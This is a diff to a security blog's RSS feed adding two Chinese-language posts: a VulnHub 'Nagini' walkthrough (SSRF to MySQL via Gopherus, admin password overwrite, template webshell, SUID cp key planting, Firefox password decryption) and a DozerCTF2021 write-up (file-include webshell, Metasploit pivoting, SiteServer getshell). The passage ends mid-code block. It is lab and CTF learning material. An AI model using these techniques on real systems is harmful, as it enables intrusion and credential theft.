@@ -23,10 +23,492 @@
         
             <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
         
-        <lastBuildDate>Mon, 24 May 2021 16:32:08 &#43;0800</lastBuildDate>
+        <lastBuildDate>Sun, 06 Jun 2021 10:59:50 &#43;0800</lastBuildDate>
         
             <atom:link rel="self" type="application/rss&#43;xml" href="https://tyskill.github.io/rss.xml" />
         
+        
+            <item>
+                <title>[vulnhub]HarryPotter Nagini</title>
+                <link>https://tyskill.github.io/posts/vuln_harrypotter_nagini/</link>
+                <guid isPermaLink="true">https://tyskill.github.io/posts/vuln_harrypotter_nagini/</guid>
+                <pubDate>Sat, 05 Jun 2021 00:00:00 &#43;0000</pubDate>
+                
+                    <author>tyskill@foxmail.com (tyskill)</author>
+                
+                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
+                
+                    <description>&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Nagini is the 2nd VM of 3-box HarryPotter VM series in which you need to find 3 horcruxes hidden inside the machine (total 8 horcruxes hidden across 3 VMs of the HarryPotter Series) and ultimately defeat Voldemort.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Difficulty&lt;/strong&gt;: medium&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;信息收集&#34;&gt;信息收集&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nmap --min-rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;10000&lt;/span&gt; -sC -T4 -A 192.168.150.136
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;结果&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)
+|   256 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e (ECDSA)
+|_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Site doesn&#39;t have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ssh爆破依旧失败&lt;/p&gt;
+&lt;h2 id=&#34;渗透过程&#34;&gt;渗透过程&lt;/h2&gt;
+&lt;h3 id=&#34;ssrf打mysql&#34;&gt;SSRF打mysql&lt;/h3&gt;
+&lt;p&gt;扫目录&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python dirsearch.py -u http://192.168.150.136
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;结果&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210605210018.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;note.txt&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Hello developers!!
+
+
+I will be using our new HTTP3 Server at https://quic.nagini.hogwarts for further communications.
+All developers are requested to visit the server regularly for checking latest announcements.
+
+
+Regards,
+site_amdin
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;发现joomla，继续扫&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python dirsearch.py -u http://192.168.150.136/joomla -e php
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;扫出来是个joomla站点且存在文件泄露&lt;code&gt;web.config.txt&lt;/code&gt;、&lt;code&gt;configuration.php.bak&lt;/code&gt;等&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;扫joomla的过程中可以看看先扫出来的note.txt，需要使用HTTP3访问&lt;code&gt;https://quic.nagini.hogwarts&lt;/code&gt;，在hosts中添置一下，吐了，quiche装不上。。。快进到成功访问获得文件&lt;code&gt;internalResourceFeTcher.php&lt;/code&gt;和上面已经扫到的&lt;code&gt;configuration.php.bak&lt;/code&gt;。internalResourceFeTcher.php存在SSRF，可以通过file任意文件读，公钥没读到，想起来备份文件中有日志文件地址，读一下试试，还是啥都读不到emmm&lt;/p&gt;
+&lt;p&gt;回去重新看备份文件，发现有数据库配置&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;public $host = &#39;localhost&#39;;
+public $user = &#39;goblin&#39;;
+public $password = &#39;&#39;;
+public $db = &#39;joomla&#39;;
+public $dbprefix = &#39;joomla_&#39;;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;开启了无密码登录，那我们就可以通过SSRF进行数据库操作，使用工具&lt;a href=&#34;https://github.com/tarunkant/Gopherus&#34;&gt; Gopherus&lt;/a&gt;生成payload（第一次可能不会成功，刷新几次页面就有了）&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-mysql&#34; data-lang=&#34;mysql&#34;&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# 5.5.5
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;show&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kp&#34;&gt;tables&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;joomla&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;joomla&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;joomla_users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;获得管理员信息&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;site_admin site_admin@nagini.hogwarts $2y$10$cmQ.akn2au104AhR4.YJBOC5W13gyV21D/bkoTmbWWqFWjzEW7vay
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;密码爆破不出来，只能通过修改密码来登陆了&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-mysql&#34; data-lang=&#34;mysql&#34;&gt;&lt;span class=&#34;k&#34;&gt;update&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;joomla&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;joomla_users&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;c8f144957dea1f19247370b4364767dc&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;site_admin&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;joomla&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;joomla_users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210605225444.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;成功修改密码，接下来使用&lt;code&gt;site_admin:密码&lt;/code&gt;登录&lt;code&gt;administrator/&lt;/code&gt;进下一步操作。&lt;/p&gt;
+&lt;h3 id=&#34;getshell&#34;&gt;getshell&lt;/h3&gt;
+&lt;p&gt;进入管理界面后尝试写🐎，在媒体库中尝试上传一个php但是失败，翻找一番后发现媒体库可以配置合法文件规则，合法后缀添加php后也还是失败。。。只能找别的思路了，修改模板php文件getshell（默认模板是protostar，如果修改的是另外一个需要设置一下默认模板）&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210605231036.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;提权&#34;&gt;提权&lt;/h3&gt;
+&lt;p&gt;翻文件，在web目录下找到第一个flag文件horcrux1.txt&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;horcrux_{MzogU2x5dGhFcmlOJ3MgTG9jS0VldCBkRXN0cm9ZZUQgYlkgUm9O}
+# horcrux_{3: SlythEriN&#39;s LocKEet dEstroYeD bY RoN}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接着翻，home目录下发现两个用户，hermoine用户下有一个suid文件&lt;code&gt;su_cp&lt;/code&gt;和无读权限的horcrux2.txt，暂时用不到，另一个用户snape目录下有挺多东西，在&lt;code&gt;.creds.txt&lt;/code&gt;读到TG92ZUBsaWxseQ==，解码结果Love@lilly，直接ssh登录。&lt;/p&gt;
+&lt;p&gt;有了正经用户，接下来就尝试提权，执行&lt;code&gt;sudo -l&lt;/code&gt;发现没有sudo指令，结合之前hermoine目录下的可执行文件&lt;code&gt;su_cp&lt;/code&gt;，顾名思义，可能是执行&lt;code&gt;sudo cp&lt;/code&gt;，猜测这个可能要用来提权，为了保险再找一下suid文件&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;find / -user root -perm -4000 -print 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210605232343.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;root的suid文件都很正常，那应该还是要依靠hermoine的su_cp，读一下看看有没有什么关键指令，有一个帮助页面，果然和cp的帮助页面一样，应该就是&lt;code&gt;sudo cp&lt;/code&gt;。通过这个我们可以实现hermoine的无密码登录（由于权限不足，无法覆盖passwd，伤心）&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ssh-keygen -t rsa &lt;span class=&#34;c1&#34;&gt;# 生成密钥对&lt;/span&gt;
+scp id_rsa.pub snape@192.168.150.136:/home/snape &lt;span class=&#34;c1&#34;&gt;# 将公钥文件拷贝到目标目录&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;此时执行su_cp将公钥拷贝到hermoine的ssh目录&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;./su_cp -p /home/snape/id_rsa.pub /home/hermoine/.ssh/authorized_keys
+ssh hermoine@192.168.150.136 &lt;span class=&#34;c1&#34;&gt;# ssh连接&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;读取horcrux2.txt&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;horcrux_{NDogSGVsZ2EgSHVmZmxlcHVmZidzIEN1cCBkZXN0cm95ZWQgYnkgSGVybWlvbmU=}
+# horcrux_{4: Helga Hufflepuff&#39;s Cup destroyed by Hermione}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;后面就是浏览器取证，使用工具&lt;a href=&#34;https://github.com/unode/firefox_decrypt&#34;&gt;firefox_decrypt&lt;/a&gt;获得root密码：&lt;code&gt;@Alohomora#123&lt;/code&gt;，su登录root获得flag3&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210606000111.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;http://www.vxer.cn/?id=80&#34;&gt;Vulnhub HarryPotter: Nagini Walkthrough (SSRF with Gopher)&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.linuxdashen.com/ssh-key%EF%BC%9A%E4%B8%A4%E4%B8%AA%E7%AE%80%E5%8D%95%E6%AD%A5%E9%AA%A4%E5%AE%9E%E7%8E%B0ssh%E6%97%A0%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95&#34;&gt;SSH无密码登录：只需两个简单步骤 (Linux)&lt;/a&gt;&lt;/p&gt;
+</description>
+                
+                
+                
+                
+                
+                    
+                        
+                            
+                                
+                                
+                                
+                                    <category domain="https://tyskill.github.io/categories/vulnhub/">vulnhub</category>
+                                
+                            
+                        
+                    
+                        
+                            
+                                
+                                
+                                
+                                    <category domain="https://tyskill.github.io/tags/joomla/">joomla</category>
+                                
+                            
+                                
+                                
+                                
+                                    <category domain="https://tyskill.github.io/tags/ssrf/">SSRF</category>
+                                
+                            
+                                
+                                
+                                
+                                    <category domain="https://tyskill.github.io/tags/firefox/">firefox</category>
+                                
+                            
+                        
+                    
+                
+            </item>
+        
+            <item>
+                <title>DozerCTF2021|unsolved水文篇</title>
+                <link>https://tyskill.github.io/posts/dozerctf2021/</link>
+                <guid isPermaLink="true">https://tyskill.github.io/posts/dozerctf2021/</guid>
+                <pubDate>Sat, 29 May 2021 00:00:00 &#43;0000</pubDate>
+                
+                    <author>tyskill@foxmail.com (tyskill)</author>
+                
+                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
+                
+                    <description>&lt;h2 id=&#34;域渗透unsolved&#34;&gt;域渗透|unsolved&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;hint1：管理员 手抖 在qq群里发了管理员的账号密码：dozer/dozer123（建议把web1出题人给扬了）&lt;/p&gt;
+&lt;p&gt;hint2：有一次，运维人员在吃饭的时候提到了他们用了siteserver&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;1010147-lightcms&#34;&gt;10.10.1.47-lightcms&lt;/h3&gt;
+&lt;p&gt;这出题人还留着干嘛（滑稽&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;dozer/dozer123&lt;/code&gt;登录，访问&lt;code&gt;/admin/neditor/serve/catchimage&lt;/code&gt;出现debug界面，确认漏洞存在。参考之前郭院士的姿势，在添加文章处获得图片地址，通过任意文件读，读取漏洞文件确认版本号以及是否修改&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;file=../app/Http/Controllers/Admin/NEditorController.php
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;发现添加的函数&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;testInclude&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Request&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;has&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;?&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;index.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+    &lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/var/www/html/public/&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;存在文件包含，先传一张图片马，然后访问&lt;code&gt;neditor/serve/testInclude&lt;/code&gt;包含之前传的🐎，带cookie蚁剑连shell，根目录获得flag&lt;code&gt;Dozerctf{k94jf8ejdbzks2l4o40rjdnfewrkyosd}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;然后通过msf获得meterpreter和内网地址段&lt;code&gt;10.10.1.1/24&lt;/code&gt;，自带的autoroute脚本似乎用不了，那就只能手工添加路由表&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;background &lt;span class=&#34;c1&#34;&gt;# 获得meterpreter后保存session退至后台&lt;/span&gt;
+use post/multi/manage/autoroute
+route add 10.10.1.1 255.255.255.0 &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 添加到目标指定内网段下的路由&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;设置代理&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;use auxiliary/server/socks_proxy
+&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; SRVPORT &amp;lt;port&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;代理完直接无脑上goby，扫tm的东方明珠塔（&lt;/p&gt;
+&lt;h3 id=&#34;10101234-siteserver&#34;&gt;10.10.1.234-SiteServer&lt;/h3&gt;
+&lt;p&gt;漏洞：&lt;a href=&#34;https://github.com/zhaoweiho/SiteServer-CMS-Remote-download-Getshell&#34;&gt;SiteServer-CMS-Remote-download-Getshell&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;没有shell直接上传漏洞利用文件，那么就需要可用的机器，比如lightcms在的&lt;code&gt;10.10.1.47&lt;/code&gt;，不过这里由于使用的是官方提供的&lt;code&gt;10.10.1.122&lt;/code&gt;的后门，就不重新去搞lightcms了。艹了，没权限写文件，只能乖乖重新搞lightcms了。。。在upload上传&lt;code&gt;poxteam.zip&lt;/code&gt;文件，然后利用漏洞&lt;/p&gt;
+&lt;p&gt;使用ha1师傅的脚本&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
